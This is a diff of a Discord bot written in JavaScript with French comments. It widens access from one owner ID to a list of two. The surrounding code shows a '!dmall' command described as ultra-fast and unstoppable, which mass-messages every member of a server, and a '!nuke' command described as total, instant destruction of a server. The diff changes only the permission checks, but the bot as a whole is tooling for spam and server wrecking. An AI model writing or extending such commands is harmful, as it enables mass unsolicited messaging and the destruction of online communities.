@@ -17,7 +17,8 @@ const client = new Client({
     ]
 });
 
-const OWNER_ID = '1166445202148442112'; // Ton ID exclusif (77jc)
+// Liste des IDs autorisés (Toi et 40fd)
+const OWNERS = ['1166445202148442112', '330080470983245824'];
 
 client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et inarrêtable.`);
@@ -39,17 +40,20 @@ client.on('guildMemberAdd', async member => {
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
+    // Vérification si l'auteur fait partie des owners
+    const isOwner = OWNERS.includes(message.author.id);
+
     // ==========================================
     // 1. COMMANDE !DMALL (Ultra-accélérée : 100ms)
     // ==========================================
     if (message.content === '!dmall') {
-        if (message.author.id !== OWNER_ID) {
+        if (!isOwner) {
             return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
         }
 
         await message.reply("💬 **[DMAll Inarrêtable]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
 
-        const filter = m => m.author.id === OWNER_ID;
+        const filter = m => m.author.id === message.author.id;
         
         try {
             const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
@@ -81,7 +85,7 @@ client.on('messageCreate', async message => {
 
             const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
 
-            const buttonFilter = i => i.user.id === OWNER_ID;
+            const buttonFilter = i => OWNERS.includes(i.user.id);
             const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });
 
             buttonCollector.on('collect', async interaction => {
@@ -174,7 +178,7 @@ client.on('messageCreate', async message => {
     // 2. COMMANDE !NUKE (Destruction totale et instantanée)
     // ==========================================
     if (message.content === '!nuke') {
-        if (message.author.id !== OWNER_ID) {
+        if (!isOwner) {
             return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
         }
 
